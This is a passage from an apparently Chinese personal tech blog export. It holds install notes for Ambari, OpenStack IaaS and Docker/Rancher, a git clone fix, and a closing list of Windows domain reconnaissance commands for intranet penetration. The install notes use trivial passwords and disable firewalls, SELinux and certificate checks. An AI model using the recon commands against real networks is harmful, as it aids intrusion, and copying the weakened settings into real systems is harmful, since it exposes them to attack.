<p><strong><code>mysql -uroot -pbigdata</code></strong></p>
<blockquote>
<blockquote>
<p>MariaDB [(none)]&gt;<strong><code>create database ambari;</code></strong></p>
<p>MariaDB [(none)]&gt; <strong><code>grant all privileges on ambari.* to &#39;ambari&#39;@&#39;localhost&#39; identified by &#39;bigdata&#39;;</code></strong></p>
<p>MariaDB [(none)]&gt; <strong><code>grant all privileges on ambari.* to &#39;ambari&#39;@&#39;%&#39; identified by &#39;bigdata&#39;;</code></strong></p>
<p>MariaDB [(none)]&gt;<strong><code>use ambari;</code></strong></p>
<p>MariaDB [ambari]&gt; <strong><code>source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</code></strong><br>MariaDB [ambari]&gt;<code>quit</code></p>
</blockquote>
</blockquote>
<p><strong><code>vi /etc/profile</code></strong></p>
<blockquote>
<p>export buildNumber=2.6.0.0</p>
</blockquote>
<p><strong><code>ambari-server setup</code></strong></p>
<blockquote>
<blockquote>
<p>Customize user account for ambari-server daemon [y/n] (n)? <strong><code>n</code></strong></p>
<p>Checking JDK…</p>
<p>[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8</p>
<p>[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7</p>
<p>[3] Custom JDk</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Enter choice (1):<strong><code>3</code></strong></p>
<p>Path to JAVA_HOME: <strong><code>/usr/jdk64/jdk1.8.0_77</code></strong></p>
<p>Enter advanced database configuration [y/n] (n)? <strong><code>y</code></strong></p>
<p>Configuring database…</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Choose one of the following options:</p>
<p>[1] - PostgreSQL (Embedded)</p>
<p>[2] - Oracle</p>
<p>[3] - MySQL / MariaDB</p>
<p>[4] - PostgreSQL</p>
<p>[5] - Microsoft SQL Server (Tech Preview)</p>
<p>[6] - SQL Anywhere</p>
<p>[7] - BDB</p>
<p>\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=</p>
<p>Enter choice (1): <strong><code>3</code></strong></p>
<p>Hostname (localhost): </p>
<p>Port (3306): </p>
<p>Database name (ambari): </p>
<p>Username (ambari): </p>
<p>Enter Database Password (bigdata): </p>
<p>Proceed with configuring remote database connection properties [y/n] (y)?</p>
</blockquote>
</blockquote>
<p><strong><code>ambari-server start</code></strong></p>
<p><a href="http://192.168.100.131:8080">http://192.168.100.131:8080</a></p>
<blockquote>
<p>admin/admin        //用户名和密码</p>
</blockquote>
<h3 id="master-amp-slave1-1"><a href="#master-amp-slave1-1" class="headerlink" title="master&amp;slave1"></a>master&amp;slave1</h3><p><strong><code>yum install -y ambari-agent</code></strong></p>
<p><strong><code>vi /etc/ambari-agent/conf/ambari-agent.ini</code></strong></p>
<blockquote>
<p>[servier]</p>
<p><em>hostname=localhost =&gt; hostname=master.hadoop</em></p>
</blockquote>
<p><strong><code>systemctl start ambari-agent</code></strong></p>
<p><strong><code>ambari-agent restart</code></strong></p>
<p><strong><code>tail -f /var/log/ambari-agent/ambari-agent.log</code></strong></p>
<p>在python 2.7.5及以上版本时，增加了certificate verification，正是因为这个特性导致ambari-agent无法连接server</p>
<p>//解决方法：修改/etc/python/cert-verification.cfg配置文件：verify=platform_default ###(这是默认配置)</p>
<p>修改为verify=disable，然后重启ambari agent，就可以正常注册</p>
<p>HDFS</p>
<p>YARN+MapReduce2</p>
<p>ZooKeeper</p>
<p>Amvari Metrics</p>
<blockquote>
<p><strong>添加Hive服务前需要先对数据库进行操作</strong></p>
<h1 id="mysql-uroot-pbigdata"><a href="#mysql-uroot-pbigdata" class="headerlink" title="mysql -uroot -pbigdata"></a>mysql -uroot -pbigdata</h1><p>MariaDB [(none)]&gt; create database hive;  </p>
<p>MariaDB [(none)]&gt; grant all privileges on hive.* to ‘hive’@’localhost’ identified by ‘bigdata’;</p>
<p>MariaDB [(none)]&gt; grant all privileges on hive.* to ‘hive’@’%’ identified by ‘bigdata’; </p>
</blockquote>
<p>Hive</p>
<p>HBase</p>
<p>Mahout</p>
<p>Pig</p>
<p>Flume</p>
<p>Spark2</p>
]]></content>
  </entry>
  <entry>
    <title>先电云计算IAAS</title>
    <url>/2019/12/24/%E5%85%88%E7%94%B5%E4%BA%91%E8%AE%A1%E7%AE%97IAAS/</url>
    <content><![CDATA[<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="controller-amp-compute"><a href="#controller-amp-compute" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>vi /etc/sysconfig/network-scripts/ifcfg-eng</code></strong></p>
<blockquote>
<p>网卡1（内网）:</p>
<p>BOOTPROTO=static</p>
<p>IPADDR=192.168.100.10        //B：192.168.100.20</p>
<p>PREFIX=24            //NETMASK=255.255.255.0</p>
<p>GATEWAY=192.168.100.1</p>
</blockquote>
<a id="more"></a>
<blockquote>
<p>网卡2（外网）:</p>
<p>BOOTPROTO=static</p>
<p>IPADDR=192.168.200.20    //B：192.168.200.20</p>
<p>PREFIX=24    //NETMASK=255.255.255.0</p>
</blockquote>
<p><strong><code>service network restart</code></strong></p>
<hr>
<h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p><strong><code>hostnamectl set-hostname controller</code></strong></p>
<hr>
<h3 id="compute"><a href="#compute" class="headerlink" title="compute"></a>compute</h3><p><strong><code>hostnamectl set-hostname compute</code></strong></p>
<hr>
<h3 id="controller-amp-compute-1"><a href="#controller-amp-compute-1" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>logout</code></strong>            //Ctr+d  重新登录</p>
<hr>
<h3 id="controller-1"><a href="#controller-1" class="headerlink" title="controller"></a>controller</h3><p><strong><code>mv /etc/yum.repo.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/iaas.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=file:///opt/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[iaas]</p>
<p>name=iaas</p>
<p>baseurl=file:///opt/iaas/iaas-repo</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/&#123;centos,iaas&#125;</code></strong></p>
<p><strong><code>mount CentOS-7-x86_64-DVD-1511.iso /mnt</code></strong></p>
<p><strong><code>cp -rfv /mnt/* /opt/centos</code></strong></p>
<p><strong><code>umout XianDian-IaaS-v2.2.iso /mnt</code></strong></p>
<p><strong><code>cp -rfv /mnt/* /opt/iaas</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum  -y install vsftpd</code></strong></p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<p><strong><code>systemctl disable firewalld</code></strong></p>
<p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p><em>SELINUX=enforcing =&gt;</em> SELINUX=permissive</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong></p>
<p><strong><code>vi /vsftpd/vsftpd.conf</code></strong></p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<hr>
<h3 id="compute-1"><a href="#compute-1" class="headerlink" title="compute"></a>compute</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/iaas.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/opt/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[iaas]</p>
<p>name=iaas</p>
<p>baseurl=ftp://192.168.100.10/opt/iaas/iaas-repo</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p>//创建两个分区做准备，记下分区号</p>
<p><strong><code>parted /dev/md126</code></strong>            //进入磁盘管理，IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z），做了磁盘阵列的是md</p>
<p><strong>(parted)<code>p</code></strong></p>
<p><strong>(parted)<code>mkpart 名字 分区起点 分区终点</code></strong>         //上一个的分区的终点为下一个分区的终点，由起终点决定大小*</p>
<p><strong>(parted)<code>p</code></strong></p>
<p><strong>(parted)<code>quit</code></strong></p>
<p><strong><code>mkfs.xfs /dev/md126p4</code></strong>        //格式化分区，注意区号</p>
<p><strong><code>mkfs.xfs /dev/md126p5</code></strong></p>
<hr>
<h2 id="通过脚本安装相关服务"><a href="#通过脚本安装相关服务" class="headerlink" title="通过脚本安装相关服务"></a>通过脚本安装相关服务</h2><h3 id="controller-amp-compute-2"><a href="#controller-amp-compute-2" class="headerlink" title="controller&amp;compute"></a>controller&amp;compute</h3><p><strong><code>yum -y install iaas-xiandian</code></strong>            //安装xiandian包并配置环境变量</p>
<p><strong><code>vi /etc/xiandain/openrc.sh</code></strong></p>
<blockquote>
<p>HOST_IP=192.168.100.10            //控制节点内网</p>
<p>HOST_NAME=controller</p>
<p>HOST_IP_NODE=192.168.100.20    //计算节点内网</p>
<p>HOST_NAME_NODE=compute</p>
<p>RABBIT_USER=openstack</p>
<p>RABBIT_PASS=000000</p>
<p>DB_PASS=000000</p>
<p>DOMAIN_NAME=demo            //（自定义）</p>
<p>ADMIN_PASS=000000</p>
<p>DEMO_PASS=000000</p>
<p>KEYSTONE_DBPASS=000000</p>
<p>GLANCE_DBPASS=000000</p>
<p>GLANCE_PASS=000000</p>
<p>NOVA_DBPASS=000000</p>
<p>NOVA_PASS=000000</p>
<p>NEUTRON_DBPASS=000000</p>
<p>NEUTRON_PASS=000000</p>
<p>METADATA_SECRET=000000</p>
<p>INTERFACE_NAME=enp9s0            //（外网网卡名）</p>
<p>CINDER_DBPASS=000000</p>
<p>CINDER_PASS=000000</p>
<p>TROVE_DBPASS=000000</p>
<p>TROVE_PASS=000000</p>
<p>BLOCK_DISK=md126p4            //（空白分区名）在计算节点上创建</p>
<p>SWIFT_PASS=000000</p>
<p>OBJECT_DISK=md126p5            //（空白分区名）在计算节点上创建</p>
<p>STORAGE_LOCAL_NET_IP=192.168.100.20  //计算节点内网</p>
<p>HEAT_DBPASS=000000</p>
<p>HEAT_PASS=000000</p>
<p>CEILOMETER_DBPASS=000000</p>
<p>CEILOMETER_PASS=000000</p>
<p>AODH_DBPASS=000000</p>
<p>AODH_PASS=000000</p>
</blockquote>
<p>//过滤语句：<strong>cat /etc/xiandian/openrc.sh |grep -v ^# |grep -v ^$</strong>        //history  查看历史命令</p>
<p><strong><code>iaas-pre-host.sh</code></strong>            //基础配置</p>
<blockquote>
<p>yum -y install <em>openstack-utils</em> openstack-selinux python-openstackclient</p>
<p>yum upgrade</p>
<p>yum -y remove NetworkManager firewalld</p>
<p>yum -y install iptables</p>
<p>yum -y install ntp</p>
</blockquote>
<p><strong><code>yum -y install openstack-utils</code></strong>        //脚本内可能未安装，自己补上</p>
<hr>
<h3 id="controller-2"><a href="#controller-2" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-mysql.sh</code></strong>        //安装数据库相关服务</p>
<blockquote>
<p>yum -y install mysql  mysql-server  MySQL-python</p>
<p>yum -y install mongodb-server mongodb</p>
<p>yum -y install rabbitmq-server</p>
<p>yum -y install memcached python-memcached</p>
</blockquote>
<hr>
<h3 id="compute-2"><a href="#compute-2" class="headerlink" title="compute"></a>compute</h3><p><strong><code>yum -y install MySQL-python</code></strong></p>
<hr>
<h3 id="controller-3"><a href="#controller-3" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-keystone.sh</code></strong>            //安装Keystone认证服务</p>
<blockquote>
<p>yum -y install openstack-keystone httpd mod_wsgi</p>
</blockquote>
<p><strong><code>iaas-install-glance.sh</code></strong>            //安装Glance镜像服务</p>
<blockquote>
<p>yum -y install openstack-glance</p>
</blockquote>
<p>上传镜像：<br><strong><code>source /etc/keystone/admin-opemrc.sh</code></strong>            //加载上传镜像需要用到的变量</p>
<p><strong><code>glance image-create --name &quot;CentOS7.0&quot; --disk-format qcow2 --container-format bare --progress &lt; /opt/iaas/images/Centos_7-x86_64_XD.qcow2</code></strong></p>
<p><strong><code>iaas-install-nova-controller.sh</code></strong>            //安装nova计算服务</p>
<blockquote>
<p>yum install -y openstack-nova-api openstack-nova-conductor openstack-nova-console openstack-nova-novncproxy openstack-nova-scheduler</p>
</blockquote>
<hr>
<h3 id="compute-3"><a href="#compute-3" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-nova-compute.sh</code></strong></p>
<blockquote>
<p>yum -y install lvm2</p>
<p>yum -y install openstack-nova-compute</p>
</blockquote>
<hr>
<h3 id="controller-4"><a href="#controller-4" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-neutron-controller.sh</code></strong>            //安装Neutron网络服务</p>
<blockquote>
<p>yum install -y openstack-neutron openstack-neutron-ml2 openstack-neutron-linuxbridge ebtables  openstack-neutron-openvswitch openstack-neutron-lbaas python-neutron-lbaas haproxy  openstack-neutron-fwaas</p>
</blockquote>
<hr>
<h3 id="compute-4"><a href="#compute-4" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-neutron-compute.sh</code></strong></p>
<blockquote>
<p>yum install -y openstack-neutron-linuxbridge ebtables ipset openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch</p>
</blockquote>
<hr>
<h3 id="controller-5"><a href="#controller-5" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-neutron-controller-gre.sh</code></strong>            //创建gre网络</p>
<hr>
<h3 id="compute-5"><a href="#compute-5" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-neutron-compute-gre.sh</code></strong></p>
<hr>
<h3 id="controller-6"><a href="#controller-6" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-dashboard.sh</code></strong>            //安装Dadhboard仪表盘服务</p>
<blockquote>
<p>yum -y install openstack-dashboard</p>
</blockquote>
<p><strong><a href="http://192.168.100.10/dashboard">http://192.168.100.10/dashboard</a></strong></p>
<hr>
<h3 id="controller-7"><a href="#controller-7" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-cinder-controller.sh</code></strong>            //安装Cinder块存储服务</p>
<blockquote>
<p>yum install -y openstack-cinder</p>
<p>cinder create  —display-name myVolume 1    //使用cinder create 创建一个新的卷</p>
<p>cinder list        //通过cinder list 命令查看是否正确创建</p>
</blockquote>
<hr>
<h3 id="compute-6"><a href="#compute-6" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-cinder-compute.sh</code></strong></p>
<blockquote>
<p>yum -y install lvm2 targetcli python-keystone openstack-cinder</p>
</blockquote>
<hr>
<h3 id="controller-8"><a href="#controller-8" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-swift-controller.sh</code></strong>            //安装Swift对象存储服务</p>
<blockquote>
<p>yum install -y openstack-swift-proxy python-swiftclient python-keystoneclient python-keystonemiddleware memcached</p>
</blockquote>
<hr>
<h3 id="compute-7"><a href="#compute-7" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-swift-compute.sh</code></strong>            //面向对象数据存贮</p>
<blockquote>
<p>yum install -y xfsprogs rsync openstack-swift-account openstack-swift-container openstack-swift-object</p>
</blockquote>
<p><strong>执行过程中需要确认登录controller节点和输入controller节点root用户密码</strong></p>
<hr>
<h3 id="controller-9"><a href="#controller-9" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-trove.sh</code></strong>            //安装Trove数据库服务</p>
<p><strong><em>//需注意安装Trove服务之前需要配置好网络（flat或gre）,创建好子网，并确认系统已经安装swift和cinder两个服务，否则安装会失败</em></strong></p>
<blockquote>
<p>yum install –y openstack-trove-guestagent openstack-trove python-troveclient  openstack-trove-ui</p>
</blockquote>
<p><strong><code>iaas-install-heat.sh</code></strong>            //安装heat集群服务</p>
<blockquote>
<p>yum install -y openstack-heat-api openstack-heat-api-cfn openstack-heat-engine</p>
</blockquote>
<p><strong><code>iaas-install-ceilometer-controller.sh</code></strong>        //安装Ceilometer架空服务</p>
<blockquote>
<p>yum install -y openstack-ceilometer-api openstack-ceilometer-collector openstack-ceilometer-notification openstack-ceilometer-central python-ceilometerclient python-ceilometermiddleware</p>
</blockquote>
<hr>
<h3 id="compute-8"><a href="#compute-8" class="headerlink" title="compute"></a>compute</h3><p><strong><code>iaas-install-ceilometer-compute.sh</code></strong></p>
<blockquote>
<p>yum install -y openstack-ceilometer-compute python-ceilometerclient python-pecan</p>
</blockquote>
<hr>
<h3 id="controller-10"><a href="#controller-10" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-alarm.sh</code></strong>            //安装alarm监控服务</p>
<blockquote>
<p>yum install -y openstack-aodh-api openstack-aodh-evaluator openstack-aodh-notifier openstack-aodh-listener openstack-aodh-expirer python-ceilometerclient</p>
</blockquote>
<hr>
<h2 id="资源聚合"><a href="#资源聚合" class="headerlink" title="资源聚合"></a>资源聚合</h2><p><strong><em>在<code>/etc/xiandian/openrc.sh</code>里把<code>compute</code>节点的<code>IP</code>和主机名改为<code>controller</code>节点的IP和主机名</em></strong></p>
<p><strong><em>在控制节点运行 <code>iaas-install-nova-compute.sh</code></em></strong></p>
<h3 id="controller-11"><a href="#controller-11" class="headerlink" title="controller"></a>controller</h3><p><strong><code>iaas-install-nova-compute.sh</code></strong></p>
]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>先电云计算PAAS</title>
    <url>/2019/12/24/%E5%85%88%E7%94%B5%E4%BA%91%E8%AE%A1%E7%AE%97PAAS/</url>
    <content><![CDATA[<h2 id="基础环境配置"><a href="#基础环境配置" class="headerlink" title="基础环境配置"></a>基础环境配置</h2><h3 id="server-amp-amp-client"><a href="#server-amp-amp-client" class="headerlink" title="server&amp;&amp;client"></a>server&amp;&amp;client</h3><p><strong><code>vi /etc/selinux/config</code></strong></p>
<blockquote>
<p>SELINUX=disavled    //若不将Selinux设为diabled则需要安装一个container-serlinux的包，该包要求版本大于2.14</p>
</blockquote>
<p><strong><code>setenforce 0</code></strong>        //reboot</p>
<p><strong><code>systemctl stop firewalld</code></strong></p>
<a id="more"></a>
<p><strong><code>systemctl disable firewalld</code></strong></p>
<p><strong><code>iptavbles -F</code></strong></p>
<p><strong><code>iptable -X</code></strong></p>
<p><strong><code>iptable -Z</code></strong></p>
<p><strong><code>/usr/sbin/iptables-save</code></strong></p>
<p><strong><code>vi /etc/sysctl.conf</code></strong></p>
<blockquote>
<p>net.ipv4.ip_forward=1</p>
<p>net.ipv4.conf.default.rp_filter=0</p>
<p>net.ipv4.conf.all.rp_filter=0</p>
</blockquote>
<p><strong><code>sysctl -p</code></strong></p>
<p><strong><code>hostnamectl set-hostname server</code></strong>            //server节点</p>
<p><strong><code>hostnamectl set-hostname client</code></strong>            //client节点</p>
<p><strong><code>vi /etc/hoasts</code></strong></p>
<blockquote>
<p>10.0.3.137 server</p>
<p>10.0.3.138 client</p>
</blockquote>
<p><strong><code>ping server</code></strong></p>
<p><strong><code>ping client</code></strong></p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/docker.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[docker]</p>
<p>name=docker</p>
<p>baseurl=file:///opt/docker/docker</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>mkdir /opt/docker</code></strong></p>
<p><strong><code>mount XianDian-PaaS-v2.2.iso /opt/docker/</code></strong></p>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum install -y vdftpd</code></strong></p>
<p><strong><code>vi /etc/vsftpd/vsftpd.conf</code></strong></p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/docker.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[docker]</p>
<p>name=docker</p>
<p>baseurl=ftp://10.0.3.137/docker/docker</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<h2 id="服务安装"><a href="#服务安装" class="headerlink" title="服务安装"></a>服务安装</h2><h3 id="server-amp-client"><a href="#server-amp-client" class="headerlink" title="server&amp;client"></a>server&amp;client</h3><p><strong><code>yum install -y docker</code></strong></p>
<p><strong><code>systemctl restart docker</code></strong></p>
<p><strong><code>systenctl enable docker</code></strong></p>
<h3 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h3><p><strong><code>cd /opt/docker/images/rancher1.6.5/</code></strong></p>
<p><strong><code>ls</code></strong>        //共有10个镜像</p>
<blockquote>
<blockquote>
<p>rancher_agent_v1.2.5.tar        rancher-net_v0.11.3.tar</p>
<p>rancher_dns_v0.15.1.tar         rancher_network-manager_v0.7.4.tar</p>
<p>rancher_healthcheck_v0.3.1.tar  rancher_scheduler_v0.8.2.tar</p>
<p>rancher_metadata_v0.9.2.tar     rancher_server_v1.6.5.tar</p>
<p>rancher_net_holder.tar          registry_latest.tar</p>
</blockquote>
</blockquote>
<p><strong><code>docker load -i registry_latest.tar</code></strong></p>
<p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</p>
<p>docker.io/registry   latest              c9bd19d022f6        15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker run -d -p 5000:5000 --restart=always --name registry docker.io/registry:latest</code></strong></p>
<blockquote>
<blockquote>
<p>20a07207bf28256d13fbc53cf2a1d978a4827bf8f360b32a8106d996f024c001</p>
</blockquote>
</blockquote>
<p><strong><code>docker ps -a</code></strong></p>
<blockquote>
<blockquote>
<p>CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                    NAMES</p>
<p>20a07207bf28        docker.io/registry:latest   “/entrypoint.sh /etc/“   8 seconds ago       Up 3 seconds        0.0.0.0:5000-&gt;5000/tcp   registry</p>
</blockquote>
</blockquote>
<h3 id="server-amp-client-1"><a href="#server-amp-client-1" class="headerlink" title="server&amp;client"></a>server&amp;client</h3><p><strong><code>vi /etc/sysconfig/docker</code></strong>            //设置仓库地址</p>
<blockquote>
<p><code>ADD_REGISTRY=&#39;--add-registry 10.0.3.137:5000&#39;            //registry：注册  10.0.3.137：server的IP</code></p>
<p><code>INSECURE_REGISTRY=&#39;--insecure-registry 10.0.3.137:5000&#39;</code>    //insecure：不稳定的</p>
</blockquote>
<p><strong><code>systemctl daemon-reload</code></strong></p>
<p><strong><code>systemctl restart docker</code></strong></p>
<p><strong><code>docker info</code></strong>                //显示 Docker 系统信息，包括镜像和容器数</p>
<h3 id="server-2"><a href="#server-2" class="headerlink" title="server"></a>server</h3><p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</p>
<p>docker.io/<code>registry   latest</code>              <code>c9bd19d022f6</code>       15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker tag c9bd19d022f6 10.0.3.137:5000/registry:latest</code></strong>    //ID要和名字一一对应，版本号用冒号隔开</p>
<p><strong><code>docker push 10.0.3.137:5000/registry:latest</code></strong></p>
<p><strong><code>docker load -i rancher_server_v1.6.5.tar</code></strong></p>
<p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</p>
<p><none>                     <none>              <code>f89070da7581</code>        3 weeks ago         984.9 MB</none></none></p>
<p>10.0.3.137:5000/registry   latest              c9bd19d022f6        15 months ago       33.27 MB</p>
<p>docker.io/registry         latest              c9bd19d022f6        15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker tag f89070da7581 10.0.3.137:5000/rancher/server:v1.6.5</code></strong>        //名字含下划线的用“/”代替</p>
<p><strong><code>docker push 10.0.3.137:5000/rancher/server:v1.6.5</code></strong></p>
<p><strong><code>docker run -d --restart=unless-stopped -p 8080:8080 rancher/server:v1.6.5</code></strong></p>
<p>//只有这两个容器需要run，<strong>别的是组件，不用run</strong></p>
<p><strong><code>docker ps -a</code></strong></p>
<blockquote>
<blockquote>
<p>CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                              NAMES</p>
<p>2ff52cf39d6f        rancher/server:v1.6.5       “/usr/bin/entry /usr/“   18 seconds ago      Up 6 seconds        3306/tcp, 0.0.0.0:8080-&gt;8080/tcp   modest_turing</p>
<p>20a07207bf28        docker.io/registry:latest   “/entrypoint.sh /etc/“   39 minutes ago      Up 38 minutes       0.0.0.0:5000-&gt;5000/tcp             registry</p>
</blockquote>
</blockquote>
<p><a href="http://10.0.3.137:8080">http://10.0.3.137:8080</a></p>
<p><strong>将剩下的8个镜像都上传上去</strong></p>
<p><strong><code>docker load -i …</code></strong></p>
<p><strong><code>docker imabes</code></strong></p>
<p><strong><code>docker tag … …</code></strong></p>
<p><strong><code>docker push …</code></strong></p>
<p><strong>注意将每个镜像的ID和名字都要对上</strong></p>
<p><code>docker kill 容器ID</code>            //用于杀死运行的容器，==容器有容器的ID镜像有镜像的ID==</p>
<p><code>docker rm 容器ID</code>        //删除一个或多个容器            -f 强制</p>
<p><code>docker rmi 镜像ID</code>        //删除本地一个或多个镜像         -f 强制</p>
<h3 id="cliant"><a href="#cliant" class="headerlink" title="cliant"></a>cliant</h3><p><strong>从网页上设置client的ip获得一串脚本后复制过来运行</strong></p>
<h2 id="后面的应用"><a href="#后面的应用" class="headerlink" title="后面的应用"></a>后面的应用</h2><p><strong>gogs</strong></p>
<p><strong>elasticsearch 2.x</strong></p>
<p><strong>Prometheus</strong></p>
]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>克隆代码仓库异常</title>
    <url>/2019/10/20/%E5%85%8B%E9%9A%86%E4%BB%A3%E7%A0%81%E4%BB%93%E5%BA%93%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<p>克隆代码仓库出现异常，异常码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: RPC 失败。curl 18 transfer closed with outstanding read data remaining</span><br><span class="line">fatal: 远端意外挂断了</span><br><span class="line">fatal: 过早的文件结束符（EOF）</span><br><span class="line">fatal: index-pack 失败</span><br></pre></td></tr></table></figure></p>
<p>这是因为代码仓库过大导致<code>git clone</code>异常，调整传输参数即可，其中<code>524288000 = 500*1024*1024</code>，即<code>500M</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>git</tag>
        <tag>坑</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透命令</title>
    <url>/2019/12/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all                      ------ 查询本机IP段，所在域等</span><br><span class="line">net user                           ------ 本机用户列表</span><br><span class="line">net localhroup administrators      ------ 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain                   ------ 查询域用户</span><br><span class="line">net group &#x2F;domain                  ------ 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain  ------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain    ------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add   ------域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain                         ------ 查看域控制器(如果有多台)</span><br><span class="line">net time &#x2F;domain          ------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net config workstation   ------ 当前登录域</span><br><span class="line">net session                  ------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword &#x2F;user:username      ------ 建立IPC会话[空连接-***]</span><br><span class="line">net share                    ------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                      ------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                ------ 查询某IP共享</span><br><span class="line">net view &#x2F;domain         ------ 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class="line">net start                                         ------ 查看当前运行的服务</span><br><span class="line">net accounts                                   ------  查看本地密码策略</span><br><span class="line">net accounts &#x2F;domain                      ------  查看域密码策略</span><br><span class="line">nbtstat –A ip                                   ------netbios 查询</span><br><span class="line">netstat –an&#x2F;ano&#x2F;anb                        ------ 网络连接查询</span><br><span class="line">route print                                      ------ 路由表</span><br></pre></td></tr></table></figure>
<a id="more"></a>
